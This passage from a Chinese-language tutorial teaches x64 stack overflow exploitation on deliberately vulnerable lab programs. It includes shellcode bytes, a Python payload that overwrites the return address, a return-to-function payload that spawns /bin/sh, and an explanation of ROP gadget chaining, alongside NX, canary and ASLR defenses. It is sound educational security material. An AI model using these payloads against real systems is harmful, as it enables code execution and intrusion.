                |   AAAAAAAA  | (should be &quot;ret rip&quot;)
                +-------------+
                |   AAAAAAAA  |
                +-------------+
                |     ...     |
                +-------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也就是说，上一个函数的&lt;strong&gt;rbp&lt;/strong&gt;数值以及main函数的&lt;strong&gt;返回地址&lt;/strong&gt;全部都被改写了，当执行完&lt;strong&gt;ret&lt;/strong&gt;命令后，cpu将跳到&lt;strong&gt;0x4141414141414141&lt;/strong&gt;(“AAAAAAAA”)地址处，开始执行此地址的指令。&lt;/p&gt;

&lt;p&gt;在Linux系统中，&lt;strong&gt;0x4141414141414141&lt;/strong&gt;是一个非法地址，因此程序会出错并退出。但是，如果用户输入了精心挑选的字符后，覆盖在这里的数值是一个合法的地址呢？如果这个地址上恰好保存了用户想要执行的恶意的指令呢？会发生什么事情？&lt;/p&gt;

&lt;p&gt;以上就是&lt;strong&gt;栈溢出&lt;/strong&gt;的本质，如果程序在接受用户输入的时候不对&lt;strong&gt;下标越界&lt;/strong&gt;进行检查，直接将其保存到栈上，用户就有可能利用这个漏洞，输入&lt;strong&gt;足够多的、精心挑选的字符&lt;/strong&gt;，改写函数的&lt;strong&gt;返回地址&lt;/strong&gt;（也可以是jmp、call指令的&lt;strong&gt;跳转地址&lt;/strong&gt;），由此获取&lt;strong&gt;对cpu的控制&lt;/strong&gt;，从而执行任何他想执行的动作。&lt;/p&gt;

&lt;p&gt;下面介绍最经典的栈溢出攻击方法：将想要执行的指令机器码写到name数组中，然后改写函数返回地址为name的起始地址，这样&lt;strong&gt;ret&lt;/strong&gt;命令执行后将会跳转到name起始地址，开始执行name数组中的机器码。&lt;/p&gt;

&lt;p&gt;我们将用这种方法执行一段简单的程序，该程序仅仅是在终端打印“Hack!”然后正常退出。&lt;/p&gt;

&lt;p&gt;首先要知道name的起始地址，打开&lt;strong&gt;gdb&lt;/strong&gt;，对&lt;strong&gt;victim&lt;/strong&gt;进行调试，输入&lt;strong&gt;gdb -q ./victim&lt;/strong&gt;，再输入&lt;strong&gt;break *main&lt;/strong&gt;在main函数的开头下一个断点，再输入&lt;strong&gt;run&lt;/strong&gt;命令开始运行，如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb -q ./victim
Reading symbols from ./victim...done.
(gdb) break *main
Breakpoint 1 at 0x400576: file victim.c, line 3.
(gdb) run
Starting program: /home/hcj/blog/rop/ch02/victim 

Breakpoint 1, main () at victim.c:3
3   int main() {
=&amp;gt; 0x0000000000400576 &amp;lt;main+0&amp;gt;: 55  push   rbp
   0x0000000000400577 &amp;lt;main+1&amp;gt;: 48 89 e5    mov    rbp,rsp
   0x000000000040057a &amp;lt;main+4&amp;gt;: 48 83 ec 40 sub    rsp,0x40
(gdb) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时程序停留在main函数的第一条指令处，输入&lt;strong&gt;p &amp;amp;name[0]&lt;/strong&gt;和&lt;strong&gt;x/gx $rsp&lt;/strong&gt;分别查看name的起始指针和此时的栈顶指针rsp。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p &amp;amp;name[0]
$1 = 0x7fffffffe100 &quot;\001&quot;
(gdb) x/gx $rsp
0x7fffffffe148: 0x00007ffff7a54b45
(gdb) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;得到name的起始指针为&lt;strong&gt;0x7fffffffe100&lt;/strong&gt;、此时的栈顶指针rsp为&lt;strong&gt;0x7fffffffe148&lt;/strong&gt;，name到rsp之间一共0x48（也就是72）个字节，这和之前的分析是一致的。&lt;/p&gt;

&lt;p&gt;下面来写攻击指令的机器码，首先写出汇编代码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[section .text]
        global _start

_start:
        jmp END
BEGIN:
        mov rax, 1
        mov rdi, 1
        pop rsi
        mov rdx, 5
        syscall

        mov rax, 0x3c
        mov rdi, 0
        syscall
END:
        call BEGIN
        DB &quot;Hack!&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这段程序和第一节的&lt;strong&gt;Hello-x64&lt;/strong&gt;基本一样，不同之处在于巧妙的利用了&lt;strong&gt;call BEGIN和pop rsi&lt;/strong&gt;获得了字符串“Hack”的地址、并保存到&lt;strong&gt;rsi&lt;/strong&gt;中。将以上代码保存为&lt;strong&gt;shell.asm&lt;/strong&gt;，编译运行一下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nasm -f elf64 shell.asm
$ ld -s -o shell shell.o
$ ./shell
Hack!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后用&lt;strong&gt;objdump&lt;/strong&gt;程序提取出机器码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d shell -M intel
...
0000000000400080 &amp;lt;.text&amp;gt;:
  400080:   eb 1e                   jmp    0x4000a0
  400082:   b8 01 00 00 00          mov    eax,0x1
  400087:   bf 01 00 00 00          mov    edi,0x1
  40008c:   5e                      pop    rsi
  40008d:   ba 05 00 00 00          mov    edx,0x5
  400092:   0f 05                   syscall 
  400094:   b8 3c 00 00 00          mov    eax,0x3c
  400099:   bf 00 00 00 00          mov    edi,0x0
  40009e:   0f 05                   syscall 
  4000a0:   e8 dd ff ff ff          call   0x400082
  4000a5:   48 61                   rex.W (bad) 
  4000a7:   63 6b 21                movsxd ebp,DWORD PTR [rbx+0x21]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以上机器码一共42个字节，&lt;strong&gt;name&lt;/strong&gt;到&lt;strong&gt;ret rip&lt;/strong&gt;之间一共72个字节，因此还需要补30个字节，最后填上&lt;strong&gt;name&lt;/strong&gt;的起始地址&lt;strong&gt;0x7fffffffe100&lt;/strong&gt;。main函数执行到&lt;strong&gt;ret&lt;/strong&gt;命令时，栈上的数据应该是下面这个样子的（注意最后的&lt;strong&gt;name起始地址&lt;/strong&gt;需要按&lt;strong&gt;小端顺序&lt;/strong&gt;保存）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                        Stack
 name(0x7fffffffe100)--&amp;gt; +---------------------------------+ &amp;lt;---+
                         |  eb 1e           (jmp END)      |     |
                BEGIN--&amp;gt; +---------------------------------+     |
                         |  b8 01 00 00 00  (mov eax,0x1)  |     |
                         +---------------------------------+     |
                         |  bf 01 00 00 00  (mov edi,0x1)  |     |
                         +---------------------------------+     |
                         |  5e              (pop rsi)      |     |
                         +---------------------------------+     |
                         |  ba 05 00 00 00  (mov edx,0x5)  |     |
                         +---------------------------------+     |
                         |  0f 05           (syscall)      |     |
                         +---------------------------------+     |
                         |  b8 3c 00 00 00  (mov eax,0x3c) |     |
                         +---------------------------------+     |
                         |  bf 00 00 00 00  (mov edi,0x0)  |     |
                         +---------------------------------+     |
                         |  0f 05           (syscall)      |     |
                   END-&amp;gt; +---------------------------------+     |
                         |  e8 dd ff ff ff  (call BEGIN)   |     |
                         +---------------------------------+     |
                         |  48 61 63 6b 21  (&quot;Hack!&quot;)      |     |
     (0x7fffffffe12a)--&amp;gt; +---------------------------------+     |
                         |  &quot;\x00&quot;*30                      |     |
  rsp(0x7fffffffe148)--&amp;gt; +---------------------------------+     |
                         |  00 e1 ff ff ff 7f 00 00        | ----+
                         +---------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上图中的栈上的所有字节码就是我们需要输入给&lt;strong&gt;scanf&lt;/strong&gt;函数的字符串，这个字符串一般称为&lt;strong&gt;shellcode&lt;/strong&gt;。由于这段&lt;strong&gt;shellcode&lt;/strong&gt;中有很多无法通过键盘输入的字节码，因此用&lt;strong&gt;python&lt;/strong&gt;将其打印至文件中：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c 'print &quot;\xeb\x1e\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x05\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x61\x63\x6b\x21&quot; + &quot;\x00&quot;*30 + &quot;\x00\xe1\xff\xff\xff\x7f\x00\x00&quot;' &amp;gt; shellcode
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在可以对&lt;strong&gt;victim&lt;/strong&gt;进行攻击了，不过目前只能在&lt;strong&gt;gdb&lt;/strong&gt;的调试环境下进行攻击。输入&lt;strong&gt;gdb -q ./victim&lt;/strong&gt;，再输入&lt;strong&gt;run &amp;lt; shellcode&lt;/strong&gt;：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb -q ./victim
Reading symbols from ./victim...done.
(gdb) run &amp;lt; shellcode
Starting program: /home/hcj/blog/rop/ch02/victim &amp;lt; shellcode
What's your name?Hello, ��!
Hack![Inferior 1 (process 2711) exited normally]
(gdb) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到&lt;strong&gt;shellcode&lt;/strong&gt;已经顺利的被执行，栈溢出攻击成功。&lt;/p&gt;

&lt;p&gt;编写&lt;strong&gt;shellcode&lt;/strong&gt;需要注意两个事情：（1） 为了使shellcode被&lt;strong&gt;scanf&lt;/strong&gt;函数全部读取，shellcode中不能含有空格字符（包括空格、回车、Tab键等），也就是说不能含有&lt;strong&gt;\x10、\x0a、\x0b、\x0c、\x20&lt;/strong&gt;等这些字节码，否则shellcode将会被&lt;strong&gt;截断&lt;/strong&gt;。如果被攻击的程序使用&lt;strong&gt;gets、strcpy&lt;/strong&gt;这些字符串拷贝函数，那么shellcode中不能含有&lt;strong&gt;\x00&lt;/strong&gt;。（2） 由于shellcode被加载到栈上的位置不是固定的，因此要求shellcode被加载到任意位置都能执行，也就是说shellcode中要使用&lt;strong&gt;相对寻址&lt;/strong&gt;。&lt;/p&gt;

&lt;h3 id=&quot;3-栈溢出攻击的防护&quot;&gt;3. 栈溢出攻击的防护&lt;/h3&gt;

&lt;p&gt;为了防止栈溢出攻击，最直接和最根本的办法当然是写出严谨的代码，剔除任何可能发生栈溢出的代码。这是程序员的责任。而另一方面，当程序代码中确实存在栈溢出漏洞时，操作系统和编译器有一些防护措施来防止栈溢出攻击，主要有以下措施。&lt;/p&gt;

&lt;h4 id=&quot;1-栈不可执行机制&quot;&gt;（1） 栈不可执行机制&lt;/h4&gt;

&lt;p&gt;操作系统可以利用cpu的硬件特性，将栈设置为不可执行的，这样上一节所述的将攻击代码放在栈上的攻击方法就无法实施了。
上一节中&lt;strong&gt;gcc victim.c -o victim -zexecstack -g&lt;/strong&gt;，其中的&lt;strong&gt;-zexecstack&lt;/strong&gt;选项就是告诉操作系统允许本程序的栈可执行。去掉此选项再编译一次试试看：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc victim.c -o victim_nx -g
$ gdb -q ./victim_nx
Reading symbols from ./victim_nx...done.
(gdb) r &amp;lt; shellcode
Starting program: /home/hcj/blog/rop/ch02/victim_nx &amp;lt; shellcode
What's your name?Hello, ��!

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffe100 in ?? ()
=&amp;gt; 0x00007fffffffe100:  eb 1e   jmp    0x7fffffffe120
(gdb) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到当程序跳转到name的起始地址&lt;strong&gt;0x00007fffffffe100&lt;/strong&gt;后，尝试执行此处的指令的时候发生了一个&lt;strong&gt;Segmentation fault&lt;/strong&gt;，之后就中止运行了。&lt;/p&gt;

&lt;p&gt;目前来说大部分程序都没有在栈上执行代码的需求，因此将栈设置为不可执行对大部分程序的正常运行都没有任何影响。目前的Linux-x64平台上默认是打开栈不可执行机制的。&lt;/p&gt;

&lt;h4 id=&quot;2-栈保护机制&quot;&gt;（2） 栈保护机制&lt;/h4&gt;

&lt;p&gt;以gcc编译器为例，编译时若打开栈保护开关，则会在函数的进入和返回的地方增加一些检测指令，这些指令的作用是：当进入函数时，在栈上、&lt;strong&gt;ret rip&lt;/strong&gt;之前保存一个只有操作系统知道的数值；当函数返回时，检查栈上这个地方的数值有没有被改写，若被改写了，则中止程序运行。由于这个数值保存在&lt;strong&gt;ret rip&lt;/strong&gt;的前面，因此若&lt;strong&gt;ret rip&lt;/strong&gt;被改写了，它肯定也会被改写。这个数值被形象的称为&lt;strong&gt;金丝雀&lt;/strong&gt;。
让我们打开栈保护开关重新编译一下&lt;strong&gt;victim.c&lt;/strong&gt;：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc victim.c -o victim_fsp -g -fstack-protector
$ objdump -d victim_fsp -M intel &amp;gt; victim_fsp.asm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;打开&lt;strong&gt;victim_fsp.asm&lt;/strong&gt;找到main函数，如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000004005d6 &amp;lt;main&amp;gt;:
  4005d6:   55                      push   rbp
  4005d7:   48 89 e5                mov    rbp,rsp
  4005da:   48 83 ec 50             sub    rsp,0x50
  
  4005de:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  4005e5:   00 00 
  4005e7:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  
...

  40062d:   48 8b 55 f8             mov    rdx,QWORD PTR [rbp-0x8]
  400631:   64 48 33 14 25 28 00    xor    rdx,QWORD PTR fs:0x28
  400638:   00 00 
  40063a:   74 05                   je     400641 &amp;lt;main+0x6b&amp;gt;
  40063c:   e8 4f fe ff ff          call   400490 &amp;lt;__stack_chk_fail@plt&amp;gt;
  400641:   c9                      leave
  400642:   c3                      ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到函数的开头增加了&lt;strong&gt;mov rax,QWORD PTR fs:0x28; mov QWORD PTR [rbp-0x8],rax&lt;/strong&gt;，函数退出之前增加了&lt;strong&gt;mov    rdx,QWORD PTR [rbp-0x8]; xor    rdx,QWORD PTR fs:0x28; je     400641 &amp;lt;main+0x6b&amp;gt;; call   400490 &amp;lt;__stack_chk_fail @ plt&amp;gt;&lt;/strong&gt;这样的检测代码。&lt;/p&gt;

&lt;p&gt;栈保护机制的缺点一个是开销太大，每个函数都要增加5条指令，第二个是只能保护函数的返回地址，无法保护jmp、call指令的跳转地址。在gcc4.9版本中默认是关闭栈保护机制的。&lt;/p&gt;

&lt;h4 id=&quot;3-内存布局随机化机制&quot;&gt;（3） 内存布局随机化机制&lt;/h4&gt;

&lt;p&gt;内存布局随机化就是将程序的加载位置、堆栈位置以及动态链接库的映射位置随机化，这样攻击者就无法知道程序的运行代码和堆栈上变量的地址。以上一节的攻击方法为例，如果程序的堆栈位置是随机的，那么攻击者就无法知道name数组的起始地址，也就无法将main函数的返回地址改写为shellcode中攻击指令的起始地址从而实施他的攻击了。&lt;/p&gt;

&lt;p&gt;内存布局随机化需要操作系统和编译器的密切配合，而全局的随机化是非常难实现的。堆栈位置随机化和动态链接库映射位置随机化的实现的代价比较小，Linux系统一般都是默认开启的。而程序加载位置随机化则要求编译器生成的代码被加载到任意位置都可以正常运行，在Linux系统下，会引起较大的性能开销，因此Linux系统下一般的用户程序都是加载到固定位置运行的。&lt;/p&gt;

&lt;p&gt;在Debian8.1和gcc4.9.2环境下实验，代码如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

char g_name[64];

void *get_rip()
{
    asm(&quot;\n\
.intel_syntax noprefix\n\
        mov rax, [rbp+8]\n\
.att_syntax\n\
    &quot;);
}

int main()
{
    char name[64];
    printf(&quot;Address of `g_name` (Global variable): %x\n&quot;, g_name);
    printf(&quot;Address of `name` (Local variable): %x\n&quot;, name);
    printf(&quot;Address of `main` (User code): %x\n&quot;, main);
    printf(&quot;Value of rip: %x\n&quot;, get_rip());
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将以上代码另存为&lt;strong&gt;aslr_test.c&lt;/strong&gt;，编译并运行几次，如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc -o aslr_test aslr_test.c
$ ./aslr_test 
Address of `g_name` (Global variable): 600a80
Address of `name` (Local variable): d3933580
Address of `main` (User code): 400510
Value of rip: 400560
$ ./aslr_test 
Address of `g_name` (Global variable): 600a80
Address of `name` (Local variable): 512cd150
Address of `main` (User code): 400510
Value of rip: 400560
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可见每次运行，只有局部变量的地址是变化的，全局变量的地址、main函数的地址以及某条指令运行时刻的实际rip数值都是不变，因此程序是被加载到固定位置运行，但堆栈位置是随机的。&lt;/p&gt;

&lt;p&gt;动态链接库的映射位置可以用&lt;strong&gt;ldd&lt;/strong&gt;命令查看，如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ldd aslr_test
    linux-vdso.so.1 (0x00007ffe1dd9d000)
    libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f26b7e71000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f26b821a000)
$ ldd aslr_test
    linux-vdso.so.1 (0x00007ffc6a771000)
    libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4ec92c0000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f4ec9669000)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可见每次运行，这三个动态链接库映射到进程&lt;strong&gt;aslr_test&lt;/strong&gt;中的位置都是变化的。&lt;/p&gt;

&lt;h3 id=&quot;4-rop-攻击&quot;&gt;4. ROP 攻击&lt;/h3&gt;

&lt;p&gt;在操作系统和编译器的保护下，程序的栈是不可运行的、栈的位置是随机的，增大了栈溢出攻击的难度。但如果程序的加载位置是固定的、或者程序中存在加载到固定位置的可执行代码，攻击者就可以利用这些固定位置上的代码来实施他的攻击。&lt;/p&gt;

&lt;p&gt;考虑下面的代码，其中含有一个&lt;strong&gt;borrowed&lt;/strong&gt;函数，作用是打开一个&lt;strong&gt;shell&lt;/strong&gt;终端。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

void borrowed() {
    execl(&quot;/bin/sh&quot;, NULL, NULL);
}

int main() {
    char name[64];
    printf(&quot;What's your name?&quot;);
    scanf(&quot;%s&quot;, name);
    printf(&quot;Hello, %s!\n&quot;, name);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将以上代码另存为&lt;strong&gt;victim.c&lt;/strong&gt;编译，并提取汇编码到&lt;strong&gt;victim.asm&lt;/strong&gt;中，如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc -o victim victim.c
$ objdump -d victim -M intel &amp;gt; victim.asm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;打开&lt;strong&gt;victim.asm&lt;/strong&gt;可以查到&lt;strong&gt;borrowed&lt;/strong&gt;函数的地址为&lt;strong&gt;0x4050b6&lt;/strong&gt;。因此，若攻击者利用栈溢出将main函数的返回地址改写为&lt;strong&gt;0x4050b6&lt;/strong&gt;，则main函数返回时会转到borrowed函数运行，打开一个shell终端，后面就可以利用终端干很多事情了。
现在来试一试吧：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c 'print &quot;\x00&quot;*72+&quot;\xb6\x05\x40\x00\x00\x00\x00\x00&quot;' &amp;gt; shellcode
$ cat shellcode - | ./victim 
What's your name?Hello, !
ls
shellcode  victim  victim.asm  victim.c
mkdir xxx
ls
shellcode  victim  victim.asm  victim.c  xxx
rmdir xxx
ls
shellcode  victim  victim.asm  victim.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看出终端被成功的打开了，并运行了&lt;strong&gt;ls、mkdir、rmdir&lt;/strong&gt;命令。&lt;/p&gt;

&lt;p&gt;注意以上攻击命令中 &lt;strong&gt;cat shellcode - | ./victim&lt;/strong&gt; 的 &lt;strong&gt;”-“&lt;/strong&gt; 是不能省略的，否则终端打开后就会立即关闭。&lt;/p&gt;

&lt;p&gt;这个例子表明，攻击者可以利用程序自身的代码来实施攻击，从而绕开栈不可执行和栈位置随机化的防护。这个程序是一个特意构造的例子，实际的程序中当然不太可能埋一个&lt;strong&gt;borrowed&lt;/strong&gt;函数这样的&lt;strong&gt;炸弹&lt;/strong&gt;来等着人来引爆。但是，攻击者可以利用程序自身的、没有任何恶意的&lt;strong&gt;代码片段&lt;/strong&gt;来组装出这样的&lt;strong&gt;炸弹&lt;/strong&gt;来，这就是&lt;strong&gt;ROP&lt;/strong&gt;攻击。&lt;/p&gt;

&lt;p&gt;ROP攻击全称为&lt;strong&gt;Return-oriented programming&lt;/strong&gt;，在这种攻击中，攻击者先搜索出程序自身中存在的&lt;strong&gt;跳板指令（gadgets）&lt;/strong&gt;，然后将一些跳板指令串起来，组装成一段完整的攻击程序。&lt;/p&gt;

&lt;p&gt;跳板指令就是以&lt;strong&gt;ret&lt;/strong&gt;结尾的指令（也可以是以&lt;strong&gt;jmp、call&lt;/strong&gt;结尾的指令），如&lt;strong&gt;mov rax, 1; ret | pop rax; ret&lt;/strong&gt;。那如何将跳板指令串起来？&lt;/p&gt;

&lt;p&gt;假如程序中在&lt;strong&gt;0x1234 | 0x5678 | 0x9abc&lt;/strong&gt;地址处分别存在三段跳板指令&lt;strong&gt;mov rax, 10; ret | mov rbx, 20; ret | add rax, rbx; ret&lt;/strong&gt;，且当前的&lt;strong&gt;rip&lt;/strong&gt;指向的指令是&lt;strong&gt;ret&lt;/strong&gt;，如果将&lt;strong&gt;0x1234 | 0x5678 | 0x9abc&lt;/strong&gt;三个地址的数值放到栈上，如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                    Stack                      Code
  rsp(+0x00)--&amp;gt;+-------------+            +-------------+&amp;lt;--rip
               |   0x1234    |--------+   |     ret     |
     (+0x08)--&amp;gt;+-------------+        |   +-------------+
               |   0x5678    |-----+  |   |     ...     |
     (+0x10)--&amp;gt;+-------------+     |  +--&amp;gt;+-------------+&amp;lt;--0x1234
               |   0x9abc    |--+  |      | mov rax, 10 |
               +-------------+  |  |      +-------------+
               |     ...     |  |  |      |     ret     |
               +-------------+  |  |      +-------------+
               |     ...     |  |  |      |     ...     |
               +-------------+  |  +-----&amp;gt;+-------------+&amp;lt;--0x5678
               |     ...     |  |         | mov rbx, 20 |
               +-------------+  |         +-------------+
               |     ...     |  |         |     ret     |
               +-------------+  |         +-------------+
               |     ...     |  |         |     ...     |
               +-------------+  +--------&amp;gt;+-------------+&amp;lt;--0x9abc
               |     ...     |            | add rax,rbx |
               +-------------+            +-------------+
               |     ...     |            |     ret     |
               +-------------+            +-------------+
Equivalent codes:
        mov rax, 10
        mov rbx, 20
        add rax, rbx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;则执行完&lt;strong&gt;ret&lt;/strong&gt;指令后，程序将跳转到&lt;strong&gt;0x1234&lt;/strong&gt;，执行此处的指令&lt;strong&gt;mov rax, 10; ret&lt;/strong&gt;，后面这个&lt;strong&gt;ret&lt;/strong&gt;指令又将跳转到&lt;strong&gt;0x5678&lt;/strong&gt;，执行&lt;strong&gt;mov rbx, 20; ret&lt;/strong&gt;，之后再跳转到&lt;strong&gt;0x9abc&lt;/strong&gt;，执行&lt;strong&gt;add rax, rbx&lt;/strong&gt;，整个流程好像在顺序执行&lt;strong&gt;mov rax, 10; mov rbx, 20; add rax, rbx&lt;/strong&gt;一样。&lt;/p&gt;

&lt;p&gt;可见只要将这些以&lt;strong&gt;ret&lt;/strong&gt;指令结尾的&lt;strong&gt;gadgets&lt;/strong&gt;的地址放在栈上合适的位置，这些&lt;strong&gt;ret&lt;/strong&gt;指令就会按指定的顺序一步步的在这些&lt;strong&gt;gadgets&lt;/strong&gt;之间跳跃。&lt;/p&gt;

&lt;p&gt;再看一个稍微复杂的例子：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                    Stack                   Code
  rsp(+0x00)--&amp;gt;+-------------+         +-------------+&amp;lt;--rip
               |    addr1    |-----+   |     ret     |
     (+0x08)--&amp;gt;+-------------+     |   +-------------+
               |    0x3b     |     |   |     ...     |
               +-------------+     +--&amp;gt;+-------------+&amp;lt;--addr1
               |    addr2    |--+      |   pop rax   |
               +-------------+  |      +-------------+
               |     ...     |  |      |     ret     |
               +-------------+  |      +-------------+
               |     ...     |  |      |     ...     |
               +-------------+  +-----&amp;gt;+-------------+&amp;lt;--addr2
               |     ...     |         |  next inst  |
               +-------------+         +-------------+
               |     ...     |         |     ret     |
               +-------------+         +-------------+
Equivalent codes:
        mov rax, 0x3b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个例子中，跳板指令是&lt;strong&gt;pop rax; ret&lt;/strong&gt;，执行完后，栈上的&lt;strong&gt;0x3b&lt;/strong&gt;将pop到rax中，因此这种型式的跳板指令可以实现对寄存器的赋值。&lt;/p&gt;

&lt;p&gt;而&lt;strong&gt;add rsp, 10h; ret&lt;/strong&gt;型式的跳板指令可以模拟流程跳转，如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                    Stack                       Code
  rsp(+0x00)--&amp;gt;+-------------+               +-------------+&amp;lt;--rip
               |    addr1    |-----------+   |     ret     |
     (+0x08)--&amp;gt;+-------------+           |   +-------------+
               |    addr2    |--------+  |   |     ...     |
               +-------------+        |  +--&amp;gt;+-------------+&amp;lt;--addr1
               |    addr3    |-----+  |      | add rsp,10h |
               +-------------+     |  |      +-------------+
               |    addr4    |--+  |  |      |     ret     |
               +-------------+  |  |  |      +-------------+
               |     ...     |  |  |  |      |     ...     |
               +-------------+  |  |  +-----&amp;gt;+-------------+&amp;lt;--addr2
               |     ...     |  |  |         |    inst2    |
               +-------------+  |  |         +-------------+
               |     ...     |  |  |         |     ret     |
               +-------------+  |  |         +-------------+
               |     ...     |  |  |         |     ...     |
               +-------------+  |  +--------&amp;gt;+-------------+&amp;lt;--addr3
               |     ...     |  |            |    inst3    |
               +-------------+  |            +-------------+
               |     ...     |  |            |     ret     |
               +-------------+  |            +-------------+
               |     ...     |  |            |     ...     |
               +-------------+  +-----------&amp;gt;+-------------+&amp;lt;--addr4
               |     ...     |               |    inst4    |
               +-------------+               +-------------+
               |     ...     |               |     ret     |
               +-------------+               +-------------+
Equivalent codes:
        jmp there
        inst2
        inst3
there:  inst4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

